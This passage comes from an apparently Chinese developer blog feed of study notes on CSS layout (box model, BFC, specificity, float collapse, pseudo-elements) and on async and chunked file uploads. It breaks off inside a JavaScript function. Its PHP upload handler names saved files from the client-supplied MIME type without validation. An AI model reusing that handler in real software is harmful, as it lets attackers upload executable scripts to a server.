href="#行内元素和块级元素什么区别，然后怎么相互转换" class="headerlink" title="行内元素和块级元素什么区别，然后怎么相互转换"></a>行内元素和块级元素什么区别，然后怎么相互转换</h1><p><strong>块级元素</strong></p><ol><li>总是从新的一行开始，即各个块级元素独占一行，默认<font color="#FF00FF">垂直向下排列</font>；</li><li>高度、宽度、margin及padding都是可控的，设置有效，有边距效果；</li><li>宽度没有设置时，<font color="#FF00FF">默认为100%</font>；</li><li>块级元素中可以包含块级元素和行内元素。</li></ol><p><strong>行内元素</strong></p><ol><li>和其他元素都在一行，即行内元素和其他行内元素都会在一条水平线上排列；</li><li>高度、宽度是不可控的，设置无效，由内容决定。</li><li>根据标签语义化的理念，行内元素<font color="#FF00FF">最好只包含行内元素，不包含块级元素</font>。</li></ol><p><strong><font color="#DC143C">转换</font></strong></p><blockquote><p>当然块级元素与行内元素之间的特性是可以相互转换的。HTML可以将元素分为行内元素、块状元素和行内块状元素三种。<br>使用display属性能够将三者任意转换：</p></blockquote><p>(1)display:inline;转换为行内元素；<br>(2)display:block;转换为块状元素；<br>(3)display:inline-block;转换为行内块状元素。</p><h1 id="块元素哪些属性可以继承？"><a href="#块元素哪些属性可以继承？" class="headerlink" title="块元素哪些属性可以继承？"></a>块元素哪些属性可以继承？</h1><p>text-indent(文本缩进)、text-align、visibility、cursor</p><h1 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：<font color="#FF8C00">外边距（margin）、边框（border）、内边距（padding）、实际内容（content</font>）四个属性。<br>CSS盒模型：<strong>标准模型 + IE模型</strong></p><ol><li>W3C盒子模型(标准盒模型)</li></ol><p><strong><font color="#FF8C00">一个盒子的总宽度= width + padding(左右) + border(左右)+ margin(左右)</font></strong> </p><p><img src="https://files.shanqianche.cn/20228/1659621954165.png" alt="标准盒子模型"></p><p>要让网页按标准盒模型去解析，则需要加上 doctype声明，否则不同的浏览器会按照自己的标准去解析。<br>2. 怪异盒模型</p><p><strong><font color="#DC143C">一个盒子的总宽度= width + margin(左右)（即width已经包含了padding和border值）</font></strong></p><p><img src="https://files.shanqianche.cn/20228/1659622032524.png" alt="怪异盒模型"></p><h2 id="标准模型和IE模型的区别"><a href="#标准模型和IE模型的区别" class="headerlink" title="标准模型和IE模型的区别"></a>标准模型和IE模型的区别</h2><p><strong>计算宽度和高度的不同</strong><br>标准盒模型：盒子总宽度/高度 =width/height + padding + border + margin。（ 即 width/height 只是 内容高度，不包含 padding 和 border 值 ）<br>IE盒子模型：盒子总宽度/高度 =width/height + margin = (内容区宽度/高度 + padding + border) + margin。（ 即 width/height 包含了 padding 和 border 值 ）</p><p><font color="#FF00FF"><strong>CSS如何设置这两种模型</strong></font></p><ul><li>标准：box-sizing: content-box;( 浏览器默认设置 )</li><li>IE：box-sizing: border-box;</li></ul><p><strong>JS如何获取盒模型对应的宽和高</strong></p><p>（1）dom.style.width/height<font color="#FF00FF">只能取到行内样式的宽和高</font>，style 标签中和 link 外链的样式取不到。<br>（2）dom.currentStyle.width/height（<font color="#FF00FF">只有IE兼容）取到的是最终渲染后的宽和高</font><br>（3）window.getComputedStyle(dom).width/height同（2）但是多浏览器支持，IE9 以上支持。<br>（4）dom.getBoundingClientRect().width/height<font color="#FF8C00">也是得到渲染后的宽和高</font>，大多浏览器支持。IE9 以上支持，除此外还可以取到相对于视窗的上下左右的距离。<br>（6）dom.offsetWidth/offsetHeigh<font color="#FF8C00">t包括高度（宽度）、内边距和边框，不包括外边距。最常用，兼容性最好</font>。<br><strong>BFC（边距重叠解决方案）</strong></p><ol><li>BFC基本概念</li></ol><p><strong>BFC: 块级格式化上下文</strong>TODO<br>BFC基本概念：BFC是CSS布局的一个概念，<font color="#FF8C00">是一块独立的渲染区域，是一个环境，里面的元素不会影响到外部的元素 。</font><br><strong>父子元素和兄弟元素边距重叠，重叠原则取最大值。</strong> 空元素的边距重叠是取margin与 padding 的最大值。</p><ol start="2"><li>BFC原理（渲染规则|布局规则）：</li></ol><p>（1）内部的Box会在<font color="#FF00FF">垂直方向</font>，从顶部开始一个接着一个地放置；<br>（2）<font color="#FF00FF">Box垂直方向的距离由margin(外边距)决定，属于同一个BFC的两个相邻Box的margin会发生重叠</font>；<br>（3）<font color="#FF00FF">每个元素的margin Box的左边， 与包含块border Box的左边相接触</font>，（对于从左到右的格式化，否则相反）。即使存在浮动也是如此；<br>（4）BFC 在页面上是一个隔离的独立容器，外面的元素不会影响里面的元素，反之亦然。文字环绕效果，设置float；<br>（5）<font color="#FF00FF">BFC 的区域不会与float Box重叠（清浮动）;</font><br>（6）计算BFC的高度时，<font color="#FF00FF">浮动元素也参与计算</font>。</p><ol start="3"><li>CSS在什么情况下会创建出BFC（即脱离文档流）</li></ol><p>0、根元素，即 HTML 元素（最大的一个BFC）<br>1、浮动（float 的值不为 none）<br>2、绝对定位元素（position 的值为 absolute 或 fixed）<br>3、行内块（display 为 inline-block）<br>4、表格单元（display 为 table、table-cell、table-caption、inline-block 等 HTML 表格相关的属性)<br>5、<font color="#FF00FF">弹性盒（display 为 flex 或 inline-flex）</font><br>6、<font color="#FF00FF">默认值。内容不会被修剪，会呈现在元素框之外（overflow 不为 visible）</font></p><ol start="4"><li><strong>BFC作用（使用场景）</strong></li></ol><p>1、自适应两（三）栏布局（避免多列布局由于宽度计算四舍五入而自动换行）<br>2、避免元素被浮动元素覆盖<br>3、<font color="#FF00FF">可以让父元素的高度包含子浮动元素，清除内部浮动（原理：触发父div的BFC属性，使下面的子div都处在父div的同一个BFC区域之内）</font><br>4、去除边距重叠现象，分属于不同的BFC时，可以阻止margin重叠</p><h2 id="IFC"><a href="#IFC" class="headerlink" title="IFC"></a>IFC</h2><p><strong>IFC: 行内格式化上下文</strong></p><p><img src="https://files.shanqianche.cn/20228/1659623431765.png" alt="IFC"></p><p><strong>IFC原理（渲染规则|布局规则）</strong><br>（1）内部的Box会在水平方向，从含块的顶部开始一个接着一个地放置；<br>（2）这些Box之间的水平方向的<font color="#FF8C00">margin，border和padding都有效；</font><br>（3）<font color="#FF00FF">Box垂直对齐方式：以它们的底部、顶部对齐，或以它们里面的文本的基线（baseline）对齐（默认， 文本与图片对其），</font>例：line-heigth与vertical-align。</p><h1 id="样式优先级"><a href="#样式优先级" class="headerlink" title="样式优先级"></a>样式优先级</h1><blockquote><p>样式类型分为三类</p></blockquote><ol><li>行间</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 style=&quot;font-size:12px;color:#000;&quot;&gt;我的行间CSS样式。&lt;/h1&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>内联</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">   h1&#123;font-size:12px;</span><br><span class="line">      color:#000;</span><br><span class="line">      &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>外部</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong><font color="#FF8C00">选择器类型</font></strong></p><ul><li>ID　　#id</li><li>class　　.class</li><li>标签　　p</li><li>通用　　*</li><li>属性　　[type=”text”]</li><li>伪类　　:hover</li><li><font color="#FF00FF"> 伪元素　　::first-line</font></li><li><font color="#FF00FF"> 子选择器、相邻选择器</font></li></ul><p><strong>权重计算规则</strong></p><p>第一等：代表内联样式，如: style=””，权值为1000。<br>第二等：代表ID选择器，如：#content，权值为0100。<br><font color="#FF8C00">第三等：代表类，伪类和属性选择器</font>，如.content，权值为0010。<br><font color="#FF8C00">第四等：代表类型选择器和伪元素选择器，</font>如div p，权值为0001。<br><font color="#FF8C00">通配符、子选择器、相邻选择器等的。如*、&gt;、+,权值为0000。</font><br><font color="#FF8C00">继承的样式没有权值。</font></p><p>比较规则遵循如下法则：</p><ul><li>选择器都有一个权值，权值越大越优先；</li><li>当权值相等时，<font color="#FF8C00">后出现的样式表设置要优于先出现的样式</font>表设置；</li><li>创作者的规则高于浏览者：<font color="#FF00FF">即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式</font>；</li><li>继承的 CSS 样式不如后来指定的 CSS 样式；</li><li>在同一组属性设置中<font color="#FF8C00">标有!important规则的优先级最大</font></li><li><font color="#FF00FF">通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先</font>。</li></ul><p><strong>！important</strong></p><ol><li>!important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt; </span><br><span class="line">p&#123;</span><br><span class="line">    color:red !important;</span><br><span class="line">&#125; </span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p style=&quot;color:blue;&quot;&gt;我显示红色&lt;/p&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>ie7+和别的浏览器对important的这种作用的支持度都很好。<font color="#FF8C00">只有ie6有些bug</font></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p&#123;</span><br><span class="line">      color:red !important;</span><br><span class="line">      color:blue;    </span><br><span class="line"> &#125;//会显示blue</span><br></pre></td></tr></table></figure><p>但是这并不说明ie6不支持important，只是支持上有些bug。看下面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p&#123;</span><br><span class="line">     color:red !important;  </span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">    color:blue;  </span><br><span class="line">&#125; //这样就会显示的是red。说明ie6还是支持important的。&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h1 id="盒子塌陷是什么？"><a href="#盒子塌陷是什么？" class="headerlink" title="盒子塌陷是什么？"></a>盒子塌陷是什么？</h1><blockquote><p><strong>本应该在父盒子内部的元素跑到了外部。</strong></p></blockquote><p><strong>关于盒子塌陷的几种解决方法:</strong><br>（1）最简单，直接，粗暴的方法就是盒子大小写死，给每个盒子设定固定的width和height，直到合适为止，这样的<font color="#FF8C00">好处是简单方便，兼容性好，适合只改动少量内容不涉及盒子排布的版面。缺点是非自适应，浏览器的窗口大小直接影响用户体验。</font><br>（2）给外部的父盒子也添加浮动，让其也脱离标准文档流，这种方法方便，<font color="#FF8C00">但是对页面的布局不是很友好，不易维护。</font><br>（3）给父盒子添加overflow属性。</p><ul><li>overflow:auto; 有可能出现滚动条，影响美观。</li><li>overflow:hidden; 可能会带来内容不可见的问题。</li></ul><p>（4）父盒子里最下方<font color="#FF8C00">引入清除浮动块。</font>最简单的有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br style=&quot;clear:both;&quot;/&gt;</span><br></pre></td></tr></table></figure><p><strong>有很多人是这么解决的，但是我们并不推荐，因为其引入了不必要的冗余元素 。</strong><br>(5)用after伪元素清除浮动<br>给外部盒子的after伪元素<font color="#FF8C00">设置clear属性</font>，再隐藏它<br>这其实是对空盒子方案的改进，一种纯CSS的解决方案，不用引入冗余元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.clearfix &#123;*zoom: 1;&#125;</span><br><span class="line">.clearfix:before,.clearfix:after &#123;</span><br><span class="line">display: table;</span><br><span class="line">line-height: 0;</span><br><span class="line">content: &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">.clearfix:after &#123;clear: both;&#125;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">这也是bootstrap框架采用的清除浮动的方法。<br>这是一种纯CSS的解决浮动造成盒子塌陷方法，没有引入任何冗余元素，推荐使用此方法来解决CSS盒子塌陷。</font><br>备注：第五种方法虽好，但是低版本IE不兼容，具体选择哪种解决方法，可根据实际情况决定。<br>(6) 给父盒子添加border<br>(7) 给父盒子设置padding-top</p><h1 id="为什么会出现盒子塌陷？"><a href="#为什么会出现盒子塌陷？" class="headerlink" title="为什么会出现盒子塌陷？"></a>为什么会出现盒子塌陷？</h1><p>当父元素没设置足够大小的时候，而子元素设置了浮动的属性，子元素就会跳出父元素的边界（脱离文档流），尤其是当父元素的高度为auto时，而父元素中又没有其它非浮动的可见元素时，父盒子的高度就会直接塌陷为零， 我们称这是CSS高度塌陷。</p><h1 id="css-伪类与伪元素区别"><a href="#css-伪类与伪元素区别" class="headerlink" title="css 伪类与伪元素区别"></a>css 伪类与伪元素区别</h1><h2 id="伪类-pseudo-classes"><a href="#伪类-pseudo-classes" class="headerlink" title="伪类(pseudo-classes)"></a>伪类(pseudo-classes)</h2><ul><li>其核⼼就是⽤来<font color="#FF8C00">选择DOM树之外的信息,</font>不能够被普通选择器选择的⽂档之外的元素，⽤来添加⼀些选择器的特殊效果。</li><li>⽐如<font color="#FF8C00">:hover :active :visited :link :visited :first-child :focus :lang</font>等</li><li>由于状态的变化是⾮静态的，所以元素达到⼀个特定状态时，它可能得到⼀个伪类的样式；当状态改变时，它⼜会失去这个样式。</li><li>由此可以看出，它的功能和class有些类似，但它是基于⽂档之外的抽象，所以叫 伪类。<h2 id="伪元素-Pseudo-elements"><a href="#伪元素-Pseudo-elements" class="headerlink" title="伪元素(Pseudo-elements)"></a>伪元素(Pseudo-elements)</h2></li><li>DOM树没有定义的虚拟元素</li><li>核⼼就是需要<font color="#FF8C00">创建通常不存在于⽂档中的元素，</font></li><li>⽐如::before ::after 它选择的是元素指定内容，<font color="#FF8C00">表示选择元素内容的之前内容或之后内容</font>。</li><li>伪元素控制的内容和元素是没有差别的，但是<font color="#FF00FF">它本身只是基于元素的抽象，并不存在于⽂档中，所以称为伪元素。</font>⽤于将特殊的效果添加到某些选择器</li></ul><h2 id="伪类与伪元素的区别"><a href="#伪类与伪元素的区别" class="headerlink" title="伪类与伪元素的区别"></a>伪类与伪元素的区别</h2><ol><li>表示⽅法</li></ol><ul><li>CSS2 中伪类、伪元素都是以单冒号:表示,</li><li>CSS2.1 后规定伪类⽤单冒号表示,伪元素⽤双冒号::表示，</li><li>浏览器同样接受 CSS2 时代已经存在的伪元素(:before, :after, :first-line, :first-letter 等)的单冒号写法。</li><li>CSS2 之后所有新增的伪元素(如::selection)，应该采⽤双冒号的写法。</li><li>CSS3中，伪类与伪元素在语法上也有所区别，<font color="#FF8C00">伪元素修改为以::开头。浏览器对以:开头的伪元素也继续⽀持，但建议规范书写为::开头</font></li></ul><ol start="2"><li>定义不同</li></ol><ul><li>伪类即假的类，可以添加类来达到效果</li><li>伪元素即假元素，需要通过添加元素才能达到效果</li></ul><ol start="3"><li>总结:</li></ol><ul><li>伪类和伪元素都是⽤来表示<font color="#FF8C00">⽂档树以外</font>的”元素”。</li><li>伪类和伪元素分别<font color="#FF8C00">⽤单冒号:和双冒号::来表示</font>。</li><li>伪类和伪元素的区别，关键点在于如果没有伪元素(或伪类)，</li><li><font color="#FF8C00">是否需要添加元素才能达到效果，如果是则是伪元素，反之则是伪类</font></li><li>伪类和伪元素都不出现在源⽂件和DOM树中。也就是说在html源⽂件中是看不到伪类和伪元素的。</li><li>伪类其实就是基于普通DOM元素⽽产⽣的不同状态，他是DOM元素的某⼀特征。</li><li>伪元素能够创建在DOM树中不存在的抽象对象，⽽且这些抽象对象是能够访问到的。</li></ul><h1 id="行内元素的margin-和-padding"><a href="#行内元素的margin-和-padding" class="headerlink" title="行内元素的margin 和 padding"></a>行内元素的margin 和 padding</h1><ul><li>水平方向：水平方向上，都有效；</li><li>垂直方向：垂直方向上，都无效；（<font color="#FF00FF">padding-top和padding-bottom会显示出效果，但是高度不会撑开，不会对周围元素有影响</font>）</li></ul><h1 id="min-width-max-width-和-min-height-max-height-属性间的覆盖规则？"><a href="#min-width-max-width-和-min-height-max-height-属性间的覆盖规则？" class="headerlink" title="min-width/max-width 和 min-height/max-height 属性间的覆盖规则？"></a>min-width/max-width 和 min-height/max-height 属性间的覆盖规则？</h1><ul><li><font color="#FF00FF">max-width 会覆盖 width，即使 width 是行内样式或者设置了 !important</font>。</li><li><font color="#FF00FF">min-width 会覆盖 max-width，此规则发生在 min-width 和 max-width 冲突的时候；</font></li></ul><h1 id="浏览器是怎样解析CSS选择器的？"><a href="#浏览器是怎样解析CSS选择器的？" class="headerlink" title="浏览器是怎样解析CSS选择器的？"></a>浏览器是怎样解析CSS选择器的？</h1><p>CSS选择器的解析是从<font color="#FF00FF">右向左解析</font>的。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。<font color="#FF00FF">若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历</font>。两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点(叶子节点)，而从左向右的匹配规则的性能都浪费在了失败的查找上面。而<font color="#FF00FF">在 CSS解析完毕后,需要将解析的结果与DOM Tree的内容-起进行分析建立-棵Render Tree，最终用来进行绘图</font>。<font color="#FF8C00">在建立Render Tree时(WebKit 中的「Attachment」过程)， 浏览器就要为每个DOM Tree中的元素根据CSS的解析结果(Style Rules)来确定生成怎样的Render Tree。</font></p>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>应用(第八天)</title>
    <link href="https://merlynr.github.io/2022/08/04/%E5%BA%94%E7%94%A8(%E7%AC%AC%E5%85%AB%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/04/%E5%BA%94%E7%94%A8(%E7%AC%AC%E5%85%AB%E5%A4%A9)/</id>
    <published>2022-08-03T16:00:00.000Z</published>
    <updated>2022-08-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件异步上传怎么实现"><a href="#文件异步上传怎么实现" class="headerlink" title="文件异步上传怎么实现"></a>文件异步上传怎么实现</h1><h2 id="普通表单上传"><a href="#普通表单上传" class="headerlink" title="普通表单上传"></a>普通表单上传</h2><p>使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为enctype=”multipart/form-data”，表明表单需要上传<font color="#FF00FF">二进制</font>数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;file&quot; name=&quot;myfile&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>然后编写index.php上传文件接收代码，使用move_uploaded_file方法即可(php大法好…)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$imgName = &#x27;IMG&#x27;.time().&#x27;.&#x27;.str_replace(&#x27;image/&#x27;,&#x27;&#x27;,$_FILES[&quot;myfile&quot;][&#x27;type&#x27;]);</span><br><span class="line">$fileName =  &#x27;upload/&#x27;.$imgName;</span><br><span class="line">// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功</span><br><span class="line">if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $fileName))&#123;</span><br><span class="line">    echo $fileName;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &quot;nonn&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>form表单上传大文件时，很容易<font color="#FF00FF">遇见服务器超时的问题。通过xhr</font>，前端也可以进行异步上传文件的操作，一般由两个思路。</p><h3 id="文件编码上传"><a href="#文件编码上传" class="headerlink" title="文件编码上传"></a>文件编码上传</h3><p>第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var imgURL = URL.createObjectURL(file);</span><br><span class="line">ctx.drawImage(imgURL, 0, 0);</span><br><span class="line">// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递</span><br><span class="line">var data = canvas.toDataURL(&quot;image/jpeg&quot;, 0.5); </span><br></pre></td></tr></table></figure><p>在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$imgData = $_REQUEST[&#x27;imgData&#x27;];</span><br><span class="line">$base64 = explode(&#x27;,&#x27;, $imgData)[1];</span><br><span class="line">$img = base64_decode($base64);</span><br><span class="line">$url = &#x27;./test.jpg&#x27;;</span><br><span class="line">if (file_put_contents($url, $img)) &#123;</span><br><span class="line">    exit(json_encode(array(</span><br><span class="line">        url =&gt; $url</span><br><span class="line">    )));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。<br>更多关于base64的知识，可以参考Base64笔记。<br>除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 读取二进制文件</span><br><span class="line">function readBinary(text)&#123;</span><br><span class="line">   var data = new ArrayBuffer(text.length);</span><br><span class="line">   var ui8a = new Uint8Array(data, 0);</span><br><span class="line">   for (var i = 0; i &lt; text.length; i++)&#123; </span><br><span class="line">     ui8a[i] = (text.charCodeAt(i) &amp; 0xff);</span><br><span class="line">   &#125;</span><br><span class="line">   console.log(ui8a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var reader = new FileReader();</span><br><span class="line">reader.onload = function()&#123;</span><br><span class="line">      readBinary(this.result) // 读取result或直接上传</span><br><span class="line">&#125;</span><br><span class="line">// 把从input里读取的文件内容，放到fileReader的result字段里</span><br><span class="line">reader.readAsBinaryString(file);</span><br></pre></td></tr></table></figure><h3 id="formData异步上传"><a href="#formData异步上传" class="headerlink" title="formData异步上传"></a>formData异步上传</h3><p>FormData对象<font color="#FF8C00">主要用来组装一组用 XMLHttpRequest发送请求的键/值对</font>，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let files = e.target.files // 获取input的file对象</span><br><span class="line">let formData = new FormData();</span><br><span class="line">formData.append(&#x27;file&#x27;, file);</span><br><span class="line">axios.post(url, formData);</span><br></pre></td></tr></table></figure><p>服务端处理方式与直接form表单请求基本相同。</p><ul><li>iframe无刷新页面</li></ul><p>在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的target属性导致的，其取值有</p><ul><li>_self，默认值，在相同的窗口中打开响应页面</li><li>_blank，在新窗口打开</li><li>_parent，在父窗口打开</li><li>_top，在最顶层的窗口打开</li><li>framename，在指定名字的iframe中打开</li></ul><p>如果需要让用户体验异步上传文件的感觉，可以通过framename指定iframe来实现。<font color="#FF00FF">把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，</font>因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function upload()&#123;</span><br><span class="line">    var now = +new Date()</span><br><span class="line">    var id = &#x27;frame&#x27; + now</span><br><span class="line">    $(&quot;body&quot;).append(`&lt;iframe style=&quot;display:none;&quot; name=&quot;$&#123;id&#125;&quot; id=&quot;$&#123;id&#125;&quot; /&gt;`);</span><br><span class="line"></span><br><span class="line">    var $form = $(&quot;#myForm&quot;)</span><br><span class="line">    $form.attr(&#123;</span><br><span class="line">        &quot;action&quot;: &#x27;/index.php&#x27;,</span><br><span class="line">        &quot;method&quot;: &quot;post&quot;,</span><br><span class="line">        &quot;enctype&quot;: &quot;multipart/form-data&quot;,</span><br><span class="line">        &quot;encoding&quot;: &quot;multipart/form-data&quot;,</span><br><span class="line">        &quot;target&quot;: id</span><br><span class="line">    &#125;).submit()</span><br><span class="line"></span><br><span class="line">    $(&quot;#&quot;+id).on(&quot;load&quot;, function()&#123;</span><br><span class="line">        var content = $(this).contents().find(&quot;body&quot;).text()</span><br><span class="line">        try&#123;</span><br><span class="line">            var data = JSON.parse(content)</span><br><span class="line">        &#125;catch(e)&#123;</span><br><span class="line">            console.log(e)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大文件上传"><a href="#大文件上传" class="headerlink" title="大文件上传"></a>大文件上传</h2><p>现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，</p><ul><li>表单上传和iframe无刷新页面上传，<font color="#FF00FF">实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形</font></li><li>通过fromData，其实际也是在<font color="#FF8C00">xhr</font>中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题</li><li><font color="#FF8C00">编码上传</font>，我们可以比较灵活地控制上传的内容</li></ul><p>大文件上传最主要的问题就在于：<font color="#FF8C00">在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传。</font>试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？</p><p>综合上面的问题，看来大文件上传需要实现下面几个需求</p><ul><li>支持拆分上传请求(即切片)</li><li>支持断点续传</li><li>支持显示上传进度和暂停上传<br>接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。<h3 id="文件切片"><a href="#文件切片" class="headerlink" title="文件切片"></a>文件切片</h3>编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。在JavaScript中，<font color="#FF00FF">文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice</font>，通过这个方法，我们就可以对二进制文件进行拆分。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function slice(file, piece = 1024 * 1024 * 5) &#123;</span><br><span class="line"> let totalSize = file.size; // 文件总大小</span><br><span class="line"> let start = 0; // 每次上传的开始字节</span><br><span class="line"> let end = start + piece; // 每次上传的结尾字节</span><br><span class="line"> let chunks = []</span><br><span class="line"> while (start &lt; totalSize) &#123;</span><br><span class="line"> // 